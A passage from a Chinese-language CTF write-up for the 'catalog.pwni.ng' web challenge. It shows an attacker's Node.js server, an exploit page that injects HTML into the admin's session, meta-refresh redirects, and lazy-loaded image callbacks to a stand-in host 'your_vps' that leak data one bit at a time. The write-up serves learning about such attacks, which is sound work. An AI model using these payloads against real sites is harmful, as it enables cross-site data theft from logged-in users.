class="hljs-keyword">let</span> match = <span class="hljs-literal">false</span>;</span><br><span class="line"></span><br><span class="line">app.get(<span class="hljs-string">&quot;/status&quot;</span>, (req, res) =&gt; {</span><br><span class="line">    res.send(<span class="hljs-string">`<span class="hljs-subst">${status}</span>`</span>);</span><br><span class="line">});</span><br><span class="line"></span><br><span class="line">app.get(<span class="hljs-string">&quot;/unlock&quot;</span>, (req, res) =&gt; {</span><br><span class="line">    unlock = <span class="hljs-literal">true</span>;</span><br><span class="line">    res.send(<span class="hljs-string">&quot;unlock&quot;</span>);</span><br><span class="line">});</span><br><span class="line"></span><br><span class="line">app.get(<span class="hljs-string">&quot;/firstload&quot;</span>, (req, res) =&gt; {</span><br><span class="line">    <span class="hljs-built_in">console</span>.log(<span class="hljs-string">&quot;==&gt; Admin opened challenge&apos;s page&quot;</span>);</span><br><span class="line">    res.send(<span class="hljs-string">&quot;firstload&quot;</span>);</span><br><span class="line">});</span><br><span class="line"></span><br><span class="line">app.get(<span class="hljs-string">&quot;/&quot;</span>, (req, res) =&gt; {</span><br><span class="line">    <span class="hljs-built_in">console</span>.log(<span class="hljs-string">&quot;==&gt; Admin was redirected to attacker&apos;s page&quot;</span>);</span><br><span class="line">    res.sendFile(<span class="hljs-string">&quot;index.html&quot;</span>, {</span><br><span class="line">        root: __dirname</span><br><span class="line">    });</span><br><span class="line">});</span><br><span class="line"></span><br><span class="line">app.get(<span class="hljs-string">&quot;/injection&quot;</span>, (req, res) =&gt; {</span><br><span class="line">    <span class="hljs-built_in">console</span>.log(<span class="hljs-string">&quot;==&gt; HTML injection was inserted into id=3 catalog&quot;</span>);</span><br><span class="line">    setTimeout(<span class="hljs-function"><span class="hljs-params">()</span> =&gt;</span> {</span><br><span class="line">        <span class="hljs-keyword">if</span> (match) <span class="hljs-built_in">console</span>.log(<span class="hljs-string">&quot;==&gt; There was a match&quot;</span>);</span><br><span class="line">        <span class="hljs-keyword">else</span> <span class="hljs-built_in">console</span>.log(<span class="hljs-string">&quot;==&gt; There wasn&apos;t a match&quot;</span>);</span><br><span class="line">        match = <span class="hljs-literal">false</span>;</span><br><span class="line">        unlock = <span class="hljs-literal">false</span>;</span><br><span class="line">        status = <span class="hljs-literal">false</span>;</span><br><span class="line">    }, <span class="hljs-number">1000</span>);</span><br><span class="line">    res.send(<span class="hljs-string">&quot;injection&quot;</span>);</span><br><span class="line">});</span><br><span class="line"></span><br><span class="line">app.get(<span class="hljs-string">&quot;/exfiltrated&quot;</span>, (req, res) =&gt; {</span><br><span class="line">    match = <span class="hljs-literal">true</span>;</span><br><span class="line">    res.send(<span class="hljs-string">&quot;exfiltrated&quot;</span>);</span><br><span class="line">});</span><br><span class="line"></span><br><span class="line">app.get(<span class="hljs-string">&quot;/fragment&quot;</span>, (req, res) =&gt; {</span><br><span class="line">    status = <span class="hljs-literal">true</span>;</span><br><span class="line">    <span class="hljs-built_in">console</span>.log(<span class="hljs-string">&quot;==&gt; Admin was fragmented&quot;</span>);</span><br><span class="line">    <span class="hljs-keyword">let</span> timer = setInterval(<span class="hljs-keyword">async</span> () =&gt; {</span><br><span class="line">        <span class="hljs-keyword">if</span> (unlock) {</span><br><span class="line">            res.send(<span class="hljs-string">&quot;fragment&quot;</span>);</span><br><span class="line">            clearInterval(timer);</span><br><span class="line">        }</span><br><span class="line">    }, <span class="hljs-number">1</span>);</span><br><span class="line">});</span><br><span class="line"></span><br><span class="line">app.listen(port);</span><br><span class="line"><span class="hljs-built_in">console</span>.log(<span class="hljs-string">&quot;Server running on port: &quot;</span> + port);</span><br></pre></td></tr></tbody></table></figure><p></p><p>index.html:</p><p></p><figure class="highlight html hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span></span><br><span class="line">    <span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span></span><br><span class="line">        <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>Psst! Get out of here...<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span></span><br><span class="line">        <span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span></span><br><span class="line"><span class="hljs-javascript">            <span class="hljs-keyword">const</span> next = <span class="hljs-keyword">async</span> () =&gt; {</span></span><br><span class="line"><span class="hljs-javascript">                <span class="hljs-keyword">let</span> res  = <span class="hljs-keyword">await</span> fetch(<span class="hljs-string">&quot;/status&quot;</span>);</span></span><br><span class="line"><span class="hljs-javascript">                <span class="hljs-keyword">let</span> status = <span class="hljs-keyword">await</span> res.text();</span></span><br><span class="line"><span class="hljs-actionscript">                <span class="hljs-keyword">if</span> (status === <span class="hljs-string">&quot;true&quot;</span>) {</span></span><br><span class="line"><span class="hljs-javascript">                    <span class="hljs-keyword">await</span> fetch(<span class="hljs-string">&quot;http://catalog.pwni.ng/user.php&quot;</span>, {</span></span><br><span class="line"><span class="hljs-actionscript">                        <span class="hljs-string">&quot;headers&quot;</span>: {</span></span><br><span class="line"><span class="hljs-actionscript">                            <span class="hljs-string">&quot;content-type&quot;</span>: <span class="hljs-string">&quot;application/x-www-form-urlencoded&quot;</span>,</span></span><br><span class="line">                        },</span><br><span class="line"><span class="hljs-handlebars"><span class="hljs-xml">                        &quot;body&quot;: `username=&quot;/&gt;<span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;http://your_vps/injection&quot;</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">align</span>=<span class="hljs-string">&quot;left&quot;</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;http://your_vps/exfiltrated&quot;</span> <span class="hljs-attr">loading</span>=<span class="hljs-string">&quot;lazy&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">em</span>&gt;</span>&amp;password=1&amp;action=login`,</span></span></span><br><span class="line"><span class="hljs-actionscript">                        <span class="hljs-string">&quot;method&quot;</span>: <span class="hljs-string">&quot;POST&quot;</span>,</span></span><br><span class="line"><span class="hljs-actionscript">                        <span class="hljs-string">&quot;mode&quot;</span>: <span class="hljs-string">&quot;no-cors&quot;</span>,</span></span><br><span class="line"><span class="hljs-actionscript">                        <span class="hljs-string">&quot;credentials&quot;</span>: <span class="hljs-string">&quot;include&quot;</span></span></span><br><span class="line">                    });</span><br><span class="line"><span class="hljs-javascript">                    <span class="hljs-keyword">await</span> fetch(<span class="hljs-string">&quot;/unlock&quot;</span>);</span></span><br><span class="line"><span class="hljs-actionscript">                } <span class="hljs-keyword">else</span> {</span></span><br><span class="line">                    next();</span><br><span class="line">                }</span><br><span class="line">            }</span><br><span class="line">            next();</span><br><span class="line">        <span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span><br><span class="line">    <span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span></span><br><span class="line">    <span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span></span><br><span class="line">        <span class="hljs-tag">&lt;<span class="hljs-name">iframe</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;http://catalog.pwni.ng/issue.php?id=issue_id_1&quot;</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;position: absolute; width: 400%; height: 500px; border: 0&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">iframe</span>&gt;</span></span><br><span class="line">    <span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span></span><br><span class="line"><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x5176;&#x4E2D;<code>your_vps</code>&#x5904;&#x66FF;&#x6362;&#x4E3A;&#x4F60;&#x7684; vps &#x5730;&#x5740;&#xFF0C;issue_id_1 &#x66FF;&#x6362;&#x4E3A;&#x4E4B;&#x524D;&#x7684;&#x6570;&#x5B57; id</p></li><li><p>&#x968F;&#x4FBF; report &#x4E00;&#x4E2A; issue &#x7ED9; admin &#x5E76;&#x6293;&#x5305;&#x4FEE;&#x6539;&#x5185;&#x5BB9;&#xFF0C;&#x628A; id &#x5B57;&#x6BB5;&#x6539;&#x6210; issue_id_2 &#x5373;&#x53EF;&#x3002;</p><p></p><figure class="highlight ini hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-attr">id</span>=<span class="hljs-number">19902</span>&amp;token=<span class="hljs-number">03</span>AGdBq26Abe5GL1dxt9c1N1n03hjoiUv1KCzn6o6VII3LGYY2JBKZLrVU5I7KxViJW8X87Nt_PJOFxyHpIFq_wq0Xph-SyP5dQTvu-s5k3AePCPKo8lMurhTM1V1Af_RdPImnBoGZb6Nm6YcilLNLeHLbGbDj7XPFCHqjdSq1zyJA7Luam8SlPzgPJOOPJYz65fXRPtn0GVunipJNjiXbXtvPKTJjPVat784uRrCQ47aHuWXnxyipstDGkZj0-iujm9k-L51EUDv9FbW4kEULU0_nDwVgtIc5ZniVcIVgupcpfGAagCLMyKGfDsFho9U4BHsdqsc7918PN<span class="hljs-literal">yeS</span>rcbPN7gmq_aLJRTGx6bICHnzHzaKNB5yakec0YsC1CQzLhtqqZhTQvEJNREkXvBHZ7PlYXdypNCNSCwI_g</span><br></pre></td></tr></tbody></table></figure><p></p><p>token &#x662F; Google &#x9A8C;&#x8BC1;&#x7801;&#x7528;&#x4E8E;&#x9A8C;&#x8BC1;&#x7684; token &#xFF0C;&#x8FD9;&#x4E2A; token &#x4F60;&#x53EF;&#x4EE5;&#x53E6;&#x5F00;&#x4E00;&#x4E2A;&#x9898;&#x76EE;&#x5730;&#x5740;&#xFF0C;&#x5E76;&#x6253;&#x5F00;&#x63A7;&#x5236;&#x53F0;&#x8F93;&#x5165;&#x4EE5;&#x4E0B;&#x4EE3;&#x7801;&#xFF08;&#x8FD9;&#x6BB5;&#x4EE3;&#x7801;&#x53EF;&#x4EE5;&#x5728;&#x9898;&#x76EE; main.js &#x62FF;&#x5230;&#xFF09;&#x5373;&#x53EF;&#xFF1A;</p><p></p><figure class="highlight javascript hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">grecaptcha.ready(<span class="hljs-keyword">async</span> () =&gt; {</span><br><span class="line">    <span class="hljs-keyword">let</span> token = <span class="hljs-keyword">await</span> grecaptcha.execute(<span class="hljs-string">&quot;6LcdheoUAAAAAOxUsM86wQa5c_wiDak2NnMIzO7Y&quot;</span>, {</span><br><span class="line">        action: <span class="hljs-string">&quot;report&quot;</span></span><br><span class="line">    });</span><br><span class="line">    <span class="hljs-built_in">console</span>.log(token);</span><br><span class="line">});</span><br></pre></td></tr></tbody></table></figure><p></p></li><li><p>&#x5982;&#x679C; vps &#x6536;&#x5230;&#x4E86; match &#xFF0C;&#x5C31;&#x5728;&#x8BE5;&#x8303;&#x56F4;&#x7EE7;&#x7EED;&#x4E8C;&#x5206;&#xFF0C;&#x4E0D;&#x7136;&#x5C31;&#x5728;&#x53E6;&#x4E00;&#x4E2A;&#x8303;&#x56F4;&#x7EE7;&#x7EED;&#x4E8C;&#x5206;&#xFF0C;&#x91CD;&#x590D;1-4&#x6B65;&#x9AA4;&#x5373;&#x53EF;</p></li></ol><h3 id="Detailed-Attack-Chain"><a href="#Detailed-Attack-Chain" class="headerlink" title="Detailed Attack Chain"></a>Detailed Attack Chain</h3><p>&#x597D;&#x4E86;&#xFF0C;&#x73B0;&#x5728;&#x6211;&#x4EEC;&#x5C31;&#x6765;&#x6574;&#x7406;&#x4E00;&#x4E0B;&#x5168;&#x90E8;&#x4FE1;&#x606F;&#xFF0C;&#x4EE5;&#x53CA;&#x8BF4;&#x4E00;&#x4E0B;&#x8BE6;&#x7EC6;&#x7684;&#x653B;&#x51FB;&#x6D41;&#x7A0B;&#xFF1A;</p><ol><li><p>&#x9996;&#x5148; admin &#x4F1A;&#x70B9;&#x51FB;&#x6211;&#x4EEC;&#x63D0;&#x4EA4;&#x7684;&#x7B2C;&#x4E8C;&#x4E2A; issue &#xFF0C;&#x7136;&#x540E;&#x56E0;&#x4E3A;&#x7B2C;&#x4E8C;&#x4E2A; issue_2 &#x5185;&#x5BB9;&#x5B58;&#x5728;</p><p></p><figure class="highlight html hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">http-equiv</span>=<span class="hljs-string">&quot;refresh&quot;</span> <span class="hljs-attr">content</span>=<span class="hljs-string">&quot;0;URL=&apos;http://your_vps/&apos;&quot;</span>&gt;</span>&quot;</span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x4F1A;&#x8DF3;&#x8F6C;&#x5230;&#x6211;&#x4EEC; vps &#x4E3B;&#x9875;&#x9762;</p></li><li><p>&#x8FD9;&#x65F6; admin &#x4F1A;&#x52A0;&#x8F7D; index.html &#xFF0C;&#x6B64;&#x65F6; iframe &#x4F1A;&#x8BF7;&#x6C42;&#x7B2C;&#x4E00;&#x4E2A; issue_1 &#x9875;&#x9762;&#xFF0C;&#x5E76;&#x4E14;&#x53D1;&#x9001;&#x8BF7;&#x6C42; <a href="http://your_vps/status" target="_blank" rel="noopener">http://your_vps/status</a> &#xFF0C;&#x6700;&#x521D;&#x59CB;&#x5316;&#x7684;&#x65F6;&#x5019;&#x56E0;&#x4E3A;<code>let status = false;</code>&#xFF0C;&#x800C; js &#x8FD8;&#x6709;&#x4E00;&#x4E2A; status &#x7684;&#x5224;&#x65AD;</p><p></p><figure class="highlight javascript hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">let</span> status = <span class="hljs-keyword">await</span> res.text();</span><br><span class="line"><span class="hljs-keyword">if</span> (status === <span class="hljs-string">&quot;true&quot;</span>) {</span><br><span class="line">  <span class="hljs-comment">//...</span></span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x6240;&#x4EE5; script &#x91CC;&#x9762;&#x7684;&#x6D41;&#x7A0B;&#x4F1A;&#x4E00;&#x76F4;&#x7B49;&#x5F85;<code>status</code>&#x7684;&#x53D8;&#x5316;&#xFF0C;&#x5B9E;&#x73B0;&#x4E86;&#x4E00;&#x4E2A;&#x7C7B;&#x4F3C;&#x4E8E;&#x9501;&#x4E00;&#x6837;&#x7684;&#x529F;&#x80FD;&#xFF0C;&#x6211;&#x4EEC;&#x8FD9;&#x91CC;&#x5C31;&#x79F0;&#x4E3A; status &#x9501;&#xFF0C;&#x800C;&#x89E3;&#x9501;&#x8FD9;&#x4E2A;&#x9501;&#x7684;&#x6761;&#x4EF6;&#x5C31;&#x662F;&#x5F53; iframe &#x91CC;&#x9762;&#x7684; issue_1 &#x5B8C;&#x5168;&#x52A0;&#x8F7D;&#x5B8C;&#x6BD5;&#x3002;</p><p>&#x5F53; iframe &#x4E2D;&#x7684; issue_1 &#x5B8C;&#x5168;&#x52A0;&#x8F7D;&#x5B8C;&#x6BD5;&#xFF0C;&#x6B64;&#x65F6; issue_1 &#x754C;&#x9762;&#x91CC;&#x9762;&#x8FD8;&#x6709;&#x4E00;&#x4E2A; img &#x6807;&#x7B7E;&#x7528;&#x4E8E;&#x89E3;&#x9501; status &#x9501;</p><p></p><figure class="highlight html hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;http://your_vps/fragment&quot;</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">http-equiv</span>=<span class="hljs-string">&quot;refresh&quot;</span>+<span class="hljs-attr">content</span>=<span class="hljs-string">&quot;0;URL=&apos;http://catalog.pwni.ng/issue.php?id=3#...&quot;</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x6B64;&#x65F6;&#x4F1A;&#x8BF7;&#x6C42;&#x6211;&#x4EEC; <a href="http://your_vps/fragment" target="_blank" rel="noopener">http://your_vps/fragment</a> </p><p></p><figure class="highlight javascript hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">app.get(<span class="hljs-string">&quot;/fragment&quot;</span>, (req, res) =&gt; {</span><br><span class="line">    status = <span class="hljs-literal">true</span>;</span><br><span class="line">    <span class="hljs-built_in">console</span>.log(<span class="hljs-string">&quot;==&gt; Admin was fragmented&quot;</span>);</span><br><span class="line">    <span class="hljs-keyword">let</span> timer = setInterval(<span class="hljs-keyword">async</span> () =&gt; {</span><br><span class="line">        <span class="hljs-keyword">if</span> (unlock) {</span><br><span class="line">            res.send(<span class="hljs-string">&quot;fragment&quot;</span>);</span><br><span class="line">            clearInterval(timer);</span><br><span class="line">        }</span><br><span class="line">    }, <span class="hljs-number">1</span>);</span><br><span class="line">});</span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x8BE5;&#x8DEF;&#x7531;&#x89E3;&#x9501;&#x4E86; status &#x9501;&#xFF0C;&#x5E76;&#x521B;&#x5EFA;&#x4E86;&#x4E00;&#x4E2A;&#x8BA1;&#x65F6;&#x5668;&#x7B49;&#x5F85; unlock &#x6765;&#x89E3;&#x9664;&#xFF0C;&#x6211;&#x4EEC;&#x79F0;&#x4E3A; fragment &#x9501;&#xFF0C;&#x8868;&#x793A; admin &#x5DF2;&#x7ECF;&#x52A0;&#x8F7D;&#x4E86; iframe &#x3002;</p></li><li><p>&#x8FD9;&#x662F;&#x56E0;&#x4E3A; fragment &#x9501;&#x7684;&#x539F;&#x56E0;&#xFF0C;iframe &#x5F53;&#x4E2D;&#x7684;&#x9875;&#x9762;&#x7B49;&#x5F85;&#x5728; issue_1 &#x754C;&#x9762;&#x7B49;&#x5F85; fragment &#x9501;&#x7684;&#x89E3;&#x9501;&#xFF0C;&#x800C;&#x5F53; status &#x9501;&#x89E3;&#x9501;&#xFF0C;&#x4F1A;&#x7ACB;&#x9A6C;&#x89E6;&#x53D1; index.html &#x5F53;&#x4E2D;&#x7684; fetch &#x8BF7;&#x6C42;</p><p></p><figure class="highlight javascript hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">await</span> fetch(<span class="hljs-string">&quot;http://catalog.pwni.ng/user.php&quot;</span>, {</span><br><span class="line">  <span class="hljs-string">&quot;headers&quot;</span>: {</span><br><span class="line">  <span class="hljs-string">&quot;content-type&quot;</span>: <span class="hljs-string">&quot;application/x-www-form-urlencoded&quot;</span>,</span><br><span class="line">  },</span><br><span class="line">  <span class="hljs-string">&quot;body&quot;</span>: <span class="hljs-string">`username=&quot;/&gt;&lt;img src=&quot;http://your_vps/injection&quot;&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;div align=&quot;left&quot;&gt;&lt;img src=&quot;http://your_vps/exfiltrated&quot; loading=&quot;lazy&quot;&gt;&lt;/div&gt;&lt;em&gt;&amp;password=1&amp;action=login`</span>,</span><br><span class="line">  <span class="hljs-string">&quot;method&quot;</span>: <span class="hljs-string">&quot;POST&quot;</span>,</span><br><span class="line">  <span class="hljs-string">&quot;mode&quot;</span>: <span class="hljs-string">&quot;no-cors&quot;</span>,</span><br><span class="line">  <span class="hljs-string">&quot;credentials&quot;</span>: <span class="hljs-string">&quot;include&quot;</span></span><br><span class="line">});</span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x8FD9;&#x65F6;&#x56E0;&#x4E3A;&#x8FD8;&#x662F; admin &#x7684; session &#xFF0C;&#x6240;&#x4EE5; admin session &#x5B58;&#x50A8;&#x7684; HTML &#x5143;&#x7D20;&#x4F1A;&#x53D8;&#x6210;&#x6211;&#x4EEC;&#x767B;&#x5F55;&#x5931;&#x8D25;&#x7684; HTML &#x5143;&#x7D20;</p></li><li><p>&#x63A5;&#x7740; index.html &#x6267;&#x884C;<code>await fetch(&quot;/unlock&quot;);</code>&#xFF0C;</p><p></p><figure class="highlight javascript hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">app.get(<span class="hljs-string">&quot;/unlock&quot;</span>, (req, res) =&gt; {</span><br><span class="line">    unlock = <span class="hljs-literal">true</span>;</span><br><span class="line">    res.send(<span class="hljs-string">&quot;unlock&quot;</span>);</span><br><span class="line">});</span><br></pre></td></tr></tbody></table></figure><p></p><p>unlock &#x8DEF;&#x7531;&#x5C06; unlock &#x7F6E;&#x4E3A; 